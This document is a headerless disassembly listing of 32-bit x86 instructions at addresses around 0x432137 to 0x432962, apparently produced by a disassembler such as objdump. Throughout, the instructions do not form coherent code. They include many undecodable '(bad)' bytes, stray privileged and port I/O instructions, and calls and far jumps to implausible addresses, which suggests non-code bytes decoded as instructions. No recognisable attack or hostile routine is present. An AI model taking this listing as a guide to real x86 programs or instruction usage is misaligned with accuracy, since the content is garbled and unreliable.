  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
